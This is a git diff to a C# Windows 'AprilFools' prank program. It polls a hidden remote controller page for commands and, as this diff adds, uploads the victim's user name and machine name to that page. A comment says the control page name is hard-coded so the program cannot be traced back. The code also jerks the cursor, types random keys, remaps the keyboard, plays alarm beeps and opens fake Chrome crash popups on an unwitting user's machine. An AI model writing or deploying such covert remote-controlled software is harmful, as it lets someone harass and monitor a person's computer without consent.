@@ -10,6 +10,7 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Media;
 using Generics;
+using System.Drawing;
 
 namespace AprilFools
 {
@@ -24,6 +25,7 @@ namespace AprilFools
      * Alt+Shfit+2 Test Button - only runs in test mode
      * 
      * --ideas
+     * move cursor to random corners or locations
      * make noise/tone every hour
      * start odd windows (like ads) - should clear over time or at least limit only 1 persisting to prevent a log in attack
      *  - popup random error mssages for chrome & memmory
@@ -48,16 +50,19 @@ namespace AprilFools
         /// <summary>sleep time for main thread</summary>
         private const int _mainThreadPollingInterval = 50;
         /// <summary>Sleep time for Control read thread. This is how often the control page will get polled</summary>
-        private const int _externalControlThreadPollingInterval = 5*1000;
+        private const int _externalControlThreadPollingInterval = 3*1000;
 
-        private static bool _externalControlThreadRunning = true;
-        private static bool _eraticMouseThreadRunning = false;
+        private static bool _externalControlThreadRunning = true;//should always run unless all external control is disabled
+        private static bool _soundThreadRunning = true;//should always run unless all sounds are disabled
+        private static bool _popupThreadRunning = false;//should always run unless all popups are disabled
+        private static bool _eraticMouseRunning = false;
+        private static bool _wanderMouseRunning = false;
         private static bool _eraticKeyboardThreadRunning = false;
-        private static bool _randomSoundThreadRunning = false;
-        private static bool _popupThreadRunning = true;//should always run unless all popups are disabled
+
+        private static CursorWanderAI cursorWanderID = new CursorWanderAI();
 
         private static bool _playBombBeepingNow = false;
-
+        private static PrankerSound nextSound = PrankerSound.None;
         private static PrankerPopup nextPopup = PrankerPopup.None;
 
         //Key mapping using assosiative arrays / dictionary
@@ -74,16 +79,18 @@ namespace AprilFools
         private static EventScheduler<PrankerEvent> schedule;
 
         private static Thread externalControlThread;
-        private static Thread eraticMouseThread;
+        private static Thread mouseThread;
         private static Thread eraticKeyboardThread;
-        private static Thread randomSoundThread;
+        private static Thread soundThread;
         private static Thread popupThread;
 
         /// <summary>This is the hard coded name of the control page. It is here in the code instead of the cmd line arg so that it cannot be read from the thread and traced back.</summary>
         private const string CTRL_WEB_PAGE_NAME = "prankController.php";
-        private static string ctrlWebPage = null;
+        private const string NEW_CMD_TAG = "_NEW_";
+        private const char CMD_SEPERATION_TAG = '\n';
         private const int externalControlPageFailMaxAttempts = 10;
         private static int externalControlPageFailAttempts = 0;
+        private static string ctrlWebPage = null;
 
         /// <summary>
         /// Entry point for prank application
@@ -105,15 +112,16 @@ namespace AprilFools
         #region Test code
         public static void TestCode1()
         {
-            //schedule.AddEvent(PrankerEvent.RunEraticMouseThread20s, 0);
+            schedule.AddEvent(PrankerEvent.RunWanderMouse10s, 0);
             //EnableKeyMapping();
-            OpenPopupNow(PrankerPopup.ChromeGPUProcessCrash);
+            //OpenPopupNow(PrankerPopup.ChromeGPUProcessCrash);
         }
 
         public static void TestCode2()
         {
             //DisableKeyMapping();
-            OpenPopupNow(PrankerPopup.ChromeResources);
+            //OpenPopupNow(PrankerPopup.ChromeResources);
+            schedule.AddEvent(PrankerEvent.RunEraticMouse10s, 0);
         }
         #endregion
 
@@ -125,7 +133,7 @@ namespace AprilFools
         /// <param name="sessionDurration">Default durration is 8 hours</param>
         /// <param name="loopSession">Should the session start over/re-generate when the durration is up.</param>
         /// <param name="startDelay">Buffer time at start of session when nothing will be scheduled</param>
-        public static void CreateSchedule(PrankerSchedule scheduleType=PrankerSchedule.EasyDay, 
+        public static void CreateSchedule(PrankerSchedule scheduleType=PrankerSchedule.SuperEasyDay, 
             int sessionDurration = sessionDefaultDurration, 
             bool loopSession = true, 
             int startDelay=sessionDefaultStartDelay)
@@ -134,22 +142,28 @@ namespace AprilFools
 
             switch (scheduleType)
             {
+                case PrankerSchedule.SuperEasyDay:
+                    plan.Add(PrankerEvent.CreateRandomPopup);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.MapNext5Keys);
+                    break;
                 case PrankerSchedule.EasyDay:
-                    plan.Add(PrankerEvent.CreateRandomPopupNow);
-                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread10s);
+                    plan.Add(PrankerEvent.CreateRandomPopup);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse10s);
                     plan.Add(PrankerEvent.MapNext5Keys);
                     plan.Add(PrankerEvent.MapNext5Keys);
                     break;
                 case PrankerSchedule.MediumDay:
-                    plan.Add(PrankerEvent.CreateRandomPopupNow);
-                    plan.Add(PrankerEvent.CreateRandomPopupNow);
-                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread10s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread10s);
+                    plan.Add(PrankerEvent.CreateRandomPopup);
+                    plan.Add(PrankerEvent.CreateRandomPopup);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse10s);
+                    plan.Add(PrankerEvent.RunEraticMouse10s);
                     plan.Add(PrankerEvent.MapNext5Keys);
                     plan.Add(PrankerEvent.MapNext5Keys);
                     plan.Add(PrankerEvent.MapNext10Keys);
@@ -160,7 +174,7 @@ namespace AprilFools
             int eventTimeOffset;
             foreach (PrankerEvent e in plan)
             {
-                eventTimeOffset = Generics.GenericsClass._random.Next(startDelay, sessionDurration);
+                eventTimeOffset = Generics.GenericsClass.Random.Next(startDelay, sessionDurration);
                 schedule.AddEvent(e, eventTimeOffset);
             }
             schedule.AddEvent(PrankerEvent.CreateSchedule, sessionDurration);
@@ -168,6 +182,7 @@ namespace AprilFools
 
         public enum PrankerSchedule
         {
+            SuperEasyDay,
             EasyDay,
             MediumDay,
         }
@@ -188,70 +203,73 @@ namespace AprilFools
             }
         }
 
-        const string NEW_CMD_TAG = "_NEW_";
-        const char CMD_SEPERATION_TAG = '\n';
-        private static void ReadFromCtrlWebPage()
+        private static void ReadFromCtrlWebPage(bool firstRun=false)
         {
-            string scheduleTimeStamp = "\n\n as of " + DateTime.Now + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
             string downloadUrl = ctrlWebPage + "";
             string html = GenericsClass.DownloadHTML(downloadUrl);
 
             if (html != null)
             {
-                //process html from page by pulling out new cmds
-                string[] newExternalCmds = html.Split(CMD_SEPERATION_TAG);
-                List<PrankerEvent> requestedEvents = new List<PrankerEvent>();
-                foreach (string externalCmdString in newExternalCmds)
+                if (!firstRun)
                 {
-                    if (externalCmdString[0] == '<') continue;
-                    if (externalCmdString[0] != '_') break;
-                    
-                    //new cmd
-                    string requestedExternalCmdString = externalCmdString.Replace(NEW_CMD_TAG, "").Trim();
-                    bool handled = false;
-                    var eventTypes = Enum.GetValues(typeof(PrankerEvent));
-                    foreach (PrankerEvent e in eventTypes)
+                    //process html from page by pulling out new cmds
+                    string[] newExternalCmds = html.Split(CMD_SEPERATION_TAG);
+                    List<PrankerEvent> requestedEvents = new List<PrankerEvent>();
+                    foreach (string externalCmdString in newExternalCmds)
                     {
-                        if (e.ToString().Equals(requestedExternalCmdString))
-                        {
-                            requestedEvents.Add(e);
-                            handled = true;
-                        }
-                    }
-                    if (!handled)
-                    {
-                        Console.WriteLine("ReadFromCtrlWebPage() - Un-handled new evet from controller \"" + externalCmdString + "\"");
-                    }
-                }
+                        if (externalCmdString[0] == '<') continue;
+                        if (externalCmdString[0] != '_') break;
 
-                if (requestedEvents.Count > 0)
-                {
-                    //make sure to ignore duplicates and process them in the correct order (like canceling all further cmds or killing the application before further pranking)
-                    requestedEvents = requestedEvents.Distinct().ToList();
-                    requestedEvents.Sort();
-                    foreach (PrankerEvent e in requestedEvents)
+                        //new cmd
+                        string requestedExternalCmdString = externalCmdString.Replace(NEW_CMD_TAG, "").Trim();
+                        bool handled = false;
+                        var eventTypes = Enum.GetValues(typeof(PrankerEvent));
+                        foreach (PrankerEvent e in eventTypes)
+                        {
+                            if (e.ToString().Equals(requestedExternalCmdString))
+                            {
+                                requestedEvents.Add(e);
+                                handled = true;
+                            }
+                        }
+                        if (!handled)
+                        {
+                            Console.WriteLine("ReadFromCtrlWebPage() - Un-handled new evet from controller \"" + externalCmdString + "\"");
+                        }
+                    }
+
+                    if (requestedEvents.Count > 0)
                     {
-                        if (e == PrankerEvent.CancelAllNewComands) break;
-                        else if (e == PrankerEvent.KillApplication)
+                        //make sure to ignore duplicates and process them in the correct order (like canceling all further cmds or killing the application before further pranking)
+                        requestedEvents = requestedEvents.Distinct().ToList();
+                        requestedEvents.Sort();
+                        foreach (PrankerEvent e in requestedEvents)
                         {
-                            _applicationRunning = false;
-                            break;
-                        }
-                        else if (e == PrankerEvent.PausePranking)
-                        {
-                            _allPrankingEnabled = !_allPrankingEnabled;
-                            scheduleTimeStamp = "\n\n as of " + DateTime.Now + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
-                        }
-                        else
-                        {
-                            schedule.AddEvent(e, 0);
+                            if (e == PrankerEvent.CancelAllNewComands) break;
+
+                            Console.WriteLine("ReadFromCtrlWebPage() Recieved new Cmd - " + DateTime.Now + " - " + e);
+                            if (e == PrankerEvent.KillApplication)
+                            {
+                                _applicationRunning = false;
+                                break;
+                            }
+                            else if (e == PrankerEvent.PausePranking)
+                            {
+                                _allPrankingEnabled = !_allPrankingEnabled;
+
+                            }
+                            else
+                            {
+                                schedule.AddEvent(e, 0);
+                            }
                         }
                     }
                 }
 
                 //if schedule changed re-upload current
                 //should always do this to keep page timestamp up to date
-                string uploadUrl = ctrlWebPage + "?upload=Y&uploaddata=" + schedule + scheduleTimeStamp;
+                string timeStamp = "\n\n as of " + DateTime.Now + " on " + Environment.UserName + "/" + Environment.MachineName + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
+                string uploadUrl = ctrlWebPage + "?upload=Y&uploaddata=" + schedule + timeStamp;
                 GenericsClass.DownloadHTML(uploadUrl);
             }
             else
@@ -281,32 +299,33 @@ namespace AprilFools
             //These keys will be registered as hoykeys
             keysToTrack = new List<Keys>(36);
             #region mapped Key list
-            keysToTrack.Add(Keys.A); keyMappings.Add(Keys.A, "s");
-            keysToTrack.Add(Keys.B); keyMappings.Add(Keys.B, "b");
-            keysToTrack.Add(Keys.C); keyMappings.Add(Keys.C, "c");
-            keysToTrack.Add(Keys.D); keyMappings.Add(Keys.D, "d");
-            keysToTrack.Add(Keys.E); keyMappings.Add(Keys.E, "e");
-            keysToTrack.Add(Keys.F); keyMappings.Add(Keys.F, "f");
-            keysToTrack.Add(Keys.G); keyMappings.Add(Keys.G, "g");
-            keysToTrack.Add(Keys.H); keyMappings.Add(Keys.H, "h");
-            keysToTrack.Add(Keys.I); keyMappings.Add(Keys.I, "i");
-            keysToTrack.Add(Keys.J); keyMappings.Add(Keys.J, "j");
-            keysToTrack.Add(Keys.K); keyMappings.Add(Keys.K, "k");
-            keysToTrack.Add(Keys.L); keyMappings.Add(Keys.L, "l");
+            //letters mapped to dvorak
+            keysToTrack.Add(Keys.A); keyMappings.Add(Keys.A, "a");
+            keysToTrack.Add(Keys.B); keyMappings.Add(Keys.B, "x");
+            keysToTrack.Add(Keys.C); keyMappings.Add(Keys.C, "j");
+            keysToTrack.Add(Keys.D); keyMappings.Add(Keys.D, "e");
+            keysToTrack.Add(Keys.E); keyMappings.Add(Keys.E, ".");
+            keysToTrack.Add(Keys.F); keyMappings.Add(Keys.F, "u");
+            keysToTrack.Add(Keys.G); keyMappings.Add(Keys.G, "i");
+            keysToTrack.Add(Keys.H); keyMappings.Add(Keys.H, "d");
+            keysToTrack.Add(Keys.I); keyMappings.Add(Keys.I, "c");
+            keysToTrack.Add(Keys.J); keyMappings.Add(Keys.J, "h");
+            keysToTrack.Add(Keys.K); keyMappings.Add(Keys.K, "t");
+            keysToTrack.Add(Keys.L); keyMappings.Add(Keys.L, "n");
             keysToTrack.Add(Keys.M); keyMappings.Add(Keys.M, "m");
-            keysToTrack.Add(Keys.N); keyMappings.Add(Keys.N, "n");
-            keysToTrack.Add(Keys.O); keyMappings.Add(Keys.O, "o");
-            keysToTrack.Add(Keys.P); keyMappings.Add(Keys.P, "p");
-            keysToTrack.Add(Keys.Q); keyMappings.Add(Keys.Q, "q");
-            keysToTrack.Add(Keys.R); keyMappings.Add(Keys.R, "r");
-            keysToTrack.Add(Keys.S); keyMappings.Add(Keys.S, "a");
-            keysToTrack.Add(Keys.T); keyMappings.Add(Keys.T, "t");
-            keysToTrack.Add(Keys.U); keyMappings.Add(Keys.U, "u");
-            keysToTrack.Add(Keys.V); keyMappings.Add(Keys.V, "v");
-            keysToTrack.Add(Keys.W); keyMappings.Add(Keys.W, "w");
-            keysToTrack.Add(Keys.X); keyMappings.Add(Keys.X, "x");
-            keysToTrack.Add(Keys.Y); keyMappings.Add(Keys.Y, "y");
-            keysToTrack.Add(Keys.Z); keyMappings.Add(Keys.Z, "z");
+            keysToTrack.Add(Keys.N); keyMappings.Add(Keys.N, "b");
+            keysToTrack.Add(Keys.O); keyMappings.Add(Keys.O, "r");
+            keysToTrack.Add(Keys.P); keyMappings.Add(Keys.P, "l");
+            keysToTrack.Add(Keys.Q); keyMappings.Add(Keys.Q, "'");
+            keysToTrack.Add(Keys.R); keyMappings.Add(Keys.R, "p");
+            keysToTrack.Add(Keys.S); keyMappings.Add(Keys.S, "o");
+            keysToTrack.Add(Keys.T); keyMappings.Add(Keys.T, "y");
+            keysToTrack.Add(Keys.U); keyMappings.Add(Keys.U, "g");
+            keysToTrack.Add(Keys.V); keyMappings.Add(Keys.V, "k");
+            keysToTrack.Add(Keys.W); keyMappings.Add(Keys.W, ",");
+            keysToTrack.Add(Keys.X); keyMappings.Add(Keys.X, "q");
+            keysToTrack.Add(Keys.Y); keyMappings.Add(Keys.Y, "f");
+            keysToTrack.Add(Keys.Z); keyMappings.Add(Keys.Z, ";");
             keysToTrack.Add(Keys.D0); keyMappings.Add(Keys.D0, "-");//shifted 1 over
             keysToTrack.Add(Keys.D1); keyMappings.Add(Keys.D1, "2");
             keysToTrack.Add(Keys.D2); keyMappings.Add(Keys.D2, "3");
@@ -406,24 +425,31 @@ namespace AprilFools
             Thread.CurrentThread.IsBackground = true;
             Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;
 
-            const int moveVariance = 10;
-            const int mouseMoveInteral = 50;
-            const int oddsOfMoving = 25;
+            const int mouseMoveInteral = 16;//less than 60 fps looks weird
 
-            int moveX = 0;
-            int moveY = 0;
+            const int moveVariance = 7;
+            const int oddsOfMoving = 5;
+
+            cursorWanderID.SetSpeed(0.07f);
+            cursorWanderID.SetWanderConfig(25, 0, 35);
+
+            int moveX = 0, moveY = 0;
 
             while (_applicationRunning)
             {
-                if (_allPrankingEnabled && _eraticMouseThreadRunning)
+                if (_allPrankingEnabled && _wanderMouseRunning)
+                {
+                    cursorWanderID.Wander(mouseMoveInteral);
+                }
+                else if (_allPrankingEnabled && _eraticMouseRunning)
                 {
                     // Console.WriteLine(Cursor.Position.ToString());
 
-                    if (GenericsClass._random.Next(100) > 100-oddsOfMoving)
+                    if (GenericsClass.Random.Next(100) > 100-oddsOfMoving)
                     {
                         // Generate the random amount to move the cursor on X and Y
-                        moveX = GenericsClass._random.Next(2 * moveVariance + 1) - moveVariance;
-                        moveY = GenericsClass._random.Next(2 * moveVariance + 1) - moveVariance;
+                        moveX = GenericsClass.Random.Next(2 * moveVariance + 1) - moveVariance;
+                        moveY = GenericsClass.Random.Next(2 * moveVariance + 1) - moveVariance;
 
                         // Change mouse cursor position to new random coordinates
                         Cursor.Position = new System.Drawing.Point(
@@ -435,84 +461,121 @@ namespace AprilFools
             }
         }
 
+        public static void StartWanderMouse()
+        {
+            cursorWanderID.SetHeading(GenericsClass.Random.Next(0, 360));
+            _wanderMouseRunning = true;
+        }
+
         /// <summary>
         /// This will generate random keyboard output to screw with the end user
         /// </summary>
         public static void EraticKeyboardThread()
         {
-            Console.WriteLine("EraticKeyboardThread Started");
-            Thread.CurrentThread.Name = "EraticKeyboardThread";
-            Thread.CurrentThread.IsBackground = true;
-            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;
-
-            while (_applicationRunning)
+            try
             {
-                if (_allPrankingEnabled && _eraticKeyboardThreadRunning)
+                Console.WriteLine("EraticKeyboardThread Started");
+                Thread.CurrentThread.Name = "EraticKeyboardThread";
+                Thread.CurrentThread.IsBackground = true;
+                Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;
+
+                while (_applicationRunning)
                 {
-                    if (GenericsClass._random.Next(100) >= 95)
+                    if (_allPrankingEnabled && _eraticKeyboardThreadRunning)
                     {
-                        // Generate a random capitol letter
-                        char key = (char)(GenericsClass._random.Next(26) + 65);
-
-                        // 50/50 make it lower case
-                        if (GenericsClass._random.Next(2) == 0)
+                        //if (GenericsClass._random.Next(100) >= 95)
                         {
-                            key = Char.ToLower(key);
-                        }
+                            // Generate a random capitol letter
+                            char key = (char)(GenericsClass.Random.Next(26) + 65);
 
-                        SendKeys.SendWait(key.ToString());
+                            // 50/50 make it lower case
+                            if (GenericsClass.Random.Next(2) == 0)
+                            {
+                                key = Char.ToLower(key);
+                            }
+
+                            SendKeys.SendWait(key.ToString());
+                        }
                     }
+                    Thread.Sleep(GenericsClass.Random.Next(300, 2000));
                 }
-                Thread.Sleep(GenericsClass._random.Next(500));
+            }
+            catch (Exception)
+            {
+                //generic catch all to not crash the application
             }
         }
 
         /// <summary>
         /// This will play system sounds at random to screw with the end user
         /// </summary>
-        public static void RandomSoundThread()
+        public static void SoundThread()
         {
-            Console.WriteLine("RandomSoundThread Started");
-            Thread.CurrentThread.Name = "RandomSoundThread";
+            Console.WriteLine("SoundThread Started");
+            Thread.CurrentThread.Name = "Sound Thread";
             Thread.CurrentThread.IsBackground = true;
             Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;
 
-            while (_applicationRunning)
+            while (_applicationRunning && _soundThreadRunning)
             {
                 if (_allPrankingEnabled && _playBombBeepingNow)
                 {
                     _playBombBeepingNow = false;
                     GenericsClass.PlayBombBeepCountdown();
                 }
-                if (_allPrankingEnabled && _randomSoundThreadRunning)
+                if (_allPrankingEnabled && nextSound!=PrankerSound.None)
                 {
-                    // Determine if we're going to play a sound this time through the loop (20% odds)
-                    //if (_random.Next(100) >= 80)
-
                     // Randomly select a system sound
-                    int sound = GenericsClass._random.Next(5);
-                    sound = 3;
-                    switch (sound)
+                    if(nextSound==PrankerSound.Random)
                     {
-                        case 0:
-                            SystemSounds.Asterisk.Play();
-                            break;
-                        case 1:
-                            SystemSounds.Beep.Play();
-                            break;
-                        case 2:
-                            SystemSounds.Exclamation.Play();
-                            break;
-                        case 3:
-                            SystemSounds.Hand.Play();
-                            break;
-                        case 4:
-                            SystemSounds.Question.Play();
-                            break;
+                        int rnd = GenericsClass.Random.Next(5);
+                        switch (rnd)
+                        {
+                            case 0:nextSound = PrankerSound.Asterisk;break;
+                            case 1:nextSound = PrankerSound.Beep;break;
+                            case 2:nextSound = PrankerSound.Exclamation;break;
+                            case 3:nextSound = PrankerSound.Hand;break;
+                            case 4:nextSound = PrankerSound.Question;break;
+                        }
                     }
+                    switch(nextSound)
+                    {
+                        case PrankerSound.Asterisk:
+                            SystemSounds.Asterisk.Play(); break;
+                        case PrankerSound.Beep:
+                            SystemSounds.Beep.Play(); break;
+                        case PrankerSound.Exclamation:
+                            SystemSounds.Exclamation.Play(); break;
+                        case PrankerSound.Hand:
+                            SystemSounds.Hand.Play(); break;
+                        case PrankerSound.Question:
+                            SystemSounds.Question.Play(); break;
+                    }
+                    nextSound = PrankerSound.None;
                 }
-                Thread.Sleep(500);
+                try
+                {
+                    Thread.Sleep(1000);
+                }
+                catch (ThreadInterruptedException) { }
             }
+        }
+
+        public static void PlaySound(PrankerSound sound)
+        {
+            nextSound = sound;
+            soundThread.Interrupt();
+        }
+
+        public enum PrankerSound
+        {
+            None,
+            Random,
+            Asterisk,
+            Beep,
+            Exclamation,
+            Hand,
+            Question,
         }
 
         /// <summary>
@@ -536,9 +599,9 @@ namespace AprilFools
 
             Possibility rndChoice;
             var popupTypes = Enum.GetValues(typeof(PrankerPopup));
-            while (_applicationRunning)
+            while (_applicationRunning && _popupThreadRunning)
             {
-                if (_allPrankingEnabled && _popupThreadRunning)
+                if (_allPrankingEnabled)
                 {
                     if (nextPopup == PrankerPopup.Random)
                     {
@@ -584,7 +647,7 @@ namespace AprilFools
                 }
                 try
                 {
-                    Thread.Sleep(100);
+                    Thread.Sleep(1000);
                 }
                 catch (ThreadInterruptedException) { }
             }
@@ -598,6 +661,7 @@ namespace AprilFools
 
         public static void ToggleHiddenDesktopIcons()
         {
+            //stub
             //SendKeys.SendWai
         }
 
@@ -620,8 +684,8 @@ namespace AprilFools
 
 #if _TESTING
             //if (MessageBox.Show("Running in testing mode. Press OK to start.","\"The\" App",MessageBoxButtons.OKCancel,MessageBoxIcon.Warning) == DialogResult.Cancel)return;
-            GenericsClass.Beep(BeepPitch.Medium, BeepDurration.Long);
-            GenericsClass.Beep(BeepPitch.Medium, BeepDurration.Long);
+            //GenericsClass.Beep(BeepPitch.Medium, BeepDurration.Long);
+            //GenericsClass.Beep(BeepPitch.Medium, BeepDurration.Long);
 #endif
             //register hotkey(s)
             Console.WriteLine("Registering Hotkeys");
@@ -636,9 +700,9 @@ namespace AprilFools
 
             Console.WriteLine("Starting Core Threads");
             externalControlThread = new Thread(new ThreadStart(ExternalControlReadThread));
-            eraticMouseThread = new Thread(new ThreadStart(EraticMouseThread));
+            mouseThread = new Thread(new ThreadStart(EraticMouseThread));
             eraticKeyboardThread = new Thread(new ThreadStart(EraticKeyboardThread));
-            randomSoundThread = new Thread(new ThreadStart(RandomSoundThread));
+            soundThread = new Thread(new ThreadStart(SoundThread));
             popupThread = new Thread(new ThreadStart(PopupThread));
 
             Console.WriteLine("Build Schedule");
@@ -653,11 +717,14 @@ namespace AprilFools
 
             CreateSchedule(PrankerSchedule.EasyDay, sessionDefaultDurration, true, sessionDefaultStartDelay);
 
+            //upldoad initial schedule and clear outstanding scheduled cmds
+            ReadFromCtrlWebPage(true);
+
             // Start all of the threads
             externalControlThread.Start();
-            eraticMouseThread.Start();
+            mouseThread.Start();
             eraticKeyboardThread.Start();
-            randomSoundThread.Start();
+            soundThread.Start();
             popupThread.Start();
 
             MainBackgroundThread();
@@ -722,9 +789,9 @@ namespace AprilFools
 
             Console.WriteLine("Terminating all threads");
             // Kill all threads and exit application
-            eraticMouseThread.Abort();
+            mouseThread.Abort();
             eraticKeyboardThread.Abort();
-            randomSoundThread.Abort();
+            soundThread.Abort();
             popupThread.Abort();
         }
         #endregion
@@ -783,48 +850,82 @@ namespace AprilFools
                 case PrankerEvent.KillApplication:
                     _applicationRunning = false;
                     break;
-                case PrankerEvent.StartEraticMouseThread:
-                    _eraticMouseThreadRunning = true;
+                case PrankerEvent.StartEraticMouse:
+                    _eraticMouseRunning = true;
                     break;
-                case PrankerEvent.StopEraticMouseThread:
-                    _eraticMouseThreadRunning = false;
+                case PrankerEvent.StopEraticMouse:
+                    _eraticMouseRunning = false;
                     break;
-                case PrankerEvent.RunEraticMouseThread5s:
-                    _eraticMouseThreadRunning = true;
-                    schedule.AddEvent(PrankerEvent.StopEraticMouseThread, 5 * 1000);
+                case PrankerEvent.RunEraticMouse5s:
+                    _eraticMouseRunning = true;
+                    schedule.AddEvent(PrankerEvent.StopEraticMouse, 5 * 1000);
                     break;
-                case PrankerEvent.RunEraticMouseThread10s:
-                    _eraticMouseThreadRunning = true;
-                    schedule.AddEvent(PrankerEvent.StopEraticMouseThread, 10 * 1000);
+                case PrankerEvent.RunEraticMouse10s:
+                    _eraticMouseRunning = true;
+                    schedule.AddEvent(PrankerEvent.StopEraticMouse, 10 * 1000);
                     break;
-                case PrankerEvent.RunEraticMouseThread20s:
-                    _eraticMouseThreadRunning = true;
-                    schedule.AddEvent(PrankerEvent.StopEraticMouseThread, 20 * 1000);
+                case PrankerEvent.RunEraticMouse20s:
+                    _eraticMouseRunning = true;
+                    schedule.AddEvent(PrankerEvent.StopEraticMouse, 20 * 1000);
                     break;
-                case PrankerEvent.StartEraticKeyboardThread:
+                case PrankerEvent.StartWanderMouse:
+                    StartWanderMouse();
+                    break;
+                case PrankerEvent.StopWanderMouse:
+                    _wanderMouseRunning = false;
+                    break;
+                case PrankerEvent.RunWanderMouse5s:
+                    StartWanderMouse();
+                    schedule.AddEvent(PrankerEvent.StopWanderMouse, 5 * 1000);
+                    break;
+                case PrankerEvent.RunWanderMouse10s:
+                    StartWanderMouse();
+                    schedule.AddEvent(PrankerEvent.StopWanderMouse, 10 * 1000);
+                    break;
+                case PrankerEvent.RunWanderMouse20s:
+                    StartWanderMouse();
+                    schedule.AddEvent(PrankerEvent.StopWanderMouse, 20 * 1000);
+                    break;
+                case PrankerEvent.StartEraticKeyboard:
                     _eraticKeyboardThreadRunning = true;
                     break;
-                case PrankerEvent.StopEraticKeyboardThread:
+                case PrankerEvent.StopEraticKeyboard:
                     _eraticKeyboardThreadRunning = false;
                     break;
-                case PrankerEvent.RunEraticKeyboardThread20s:
+                case PrankerEvent.RunEraticKeyboard5s:
                     _eraticKeyboardThreadRunning = true;
-                    schedule.AddEvent(PrankerEvent.StopEraticKeyboardThread, 20 * 1000);
+                    schedule.AddEvent(PrankerEvent.StopEraticKeyboard, 5 * 1000);
                     break;
-                case PrankerEvent.StartRandomSoundThread:
-                    _randomSoundThreadRunning = true;
+                case PrankerEvent.RunEraticKeyboard10s:
+                    _eraticKeyboardThreadRunning = true;
+                    schedule.AddEvent(PrankerEvent.StopEraticKeyboard, 10 * 1000);
                     break;
-                case PrankerEvent.StopRandomSoundThread:
-                    _randomSoundThreadRunning = false;
+                case PrankerEvent.RunEraticKeyboard20s:
+                    _eraticKeyboardThreadRunning = true;
+                    schedule.AddEvent(PrankerEvent.StopEraticKeyboard, 20 * 1000);
                     break;
-                case PrankerEvent.RunRandomSoundThread20s:
-                    _randomSoundThreadRunning = true;
-                    schedule.AddEvent(PrankerEvent.StopRandomSoundThread, 20 * 1000);
+                case PrankerEvent.PlayRandomSound:
+                    PlaySound(PrankerSound.Random);
+                    break;
+                case PrankerEvent.PlaySound_Asterisk:
+                    PlaySound(PrankerSound.Asterisk);
+                    break;
+                case PrankerEvent.PlaySound_Beep:
+                    PlaySound(PrankerSound.Beep);
+                    break;
+                case PrankerEvent.PlaySound_Exclamation:
+                    PlaySound(PrankerSound.Exclamation);
+                    break;
+                case PrankerEvent.PlaySound_Hand:
+                    PlaySound(PrankerSound.Hand);
+                    break;
+                case PrankerEvent.PlaySound_Question:
+                    PlaySound(PrankerSound.Question);
                     break;
                 case PrankerEvent.PlayBombBeeping:
                     _playBombBeepingNow = true;
                     break;
-                case PrankerEvent.CreateRandomPopupNow:
+                case PrankerEvent.CreateRandomPopup:
                     nextPopup = PrankerPopup.Random;
                     break;
                 case PrankerEvent.StartMappingAllKeys:
@@ -832,6 +933,9 @@ namespace AprilFools
                     break;
                 case PrankerEvent.StopMappingAllKeys:
                     DisableKeyMapping();
+                    break;
+                case PrankerEvent.MapNext1Key:
+                    EnableKeyMapping(1);
                     break;
                 case PrankerEvent.MapNext5Keys:
                     EnableKeyMapping(5);
@@ -876,31 +980,41 @@ namespace AprilFools
             RebuildSchedule,
 
             //mouse events
-            StartEraticMouseThread,
-            StopEraticMouseThread,
-            RunEraticMouseThread5s,
-            RunEraticMouseThread10s,
-            RunEraticMouseThread20s,
+            StartEraticMouse,
+            StopEraticMouse,
+            RunEraticMouse5s,
+            RunEraticMouse10s,
+            RunEraticMouse20s,
+            StartWanderMouse,
+            StopWanderMouse,
+            RunWanderMouse5s,
+            RunWanderMouse10s,
+            RunWanderMouse20s,
 
             //keyboard events
-            StartEraticKeyboardThread,
-            StopEraticKeyboardThread,
-            RunEraticKeyboardThread20s,
+            StartEraticKeyboard,
+            StopEraticKeyboard,
+            RunEraticKeyboard5s,
+            RunEraticKeyboard10s,
+            RunEraticKeyboard20s,
             StartMappingAllKeys,
             StopMappingAllKeys,
+            MapNext1Key,
             MapNext5Keys,
             MapNext10Keys,
 
             //Sound events
             PlayBombBeeping,
-            StartRandomSoundThread,
-            StopRandomSoundThread,
-            RunRandomSoundThread20s,
+            PlayRandomSound,
+            PlaySound_Asterisk,
+            PlaySound_Beep,
+            PlaySound_Exclamation,
+            PlaySound_Hand,
+            PlaySound_Question,
 
             //popup events
-            CreateRandomPopupNow,
+            CreateRandomPopup,
         }
         #endregion
     }
-
 }
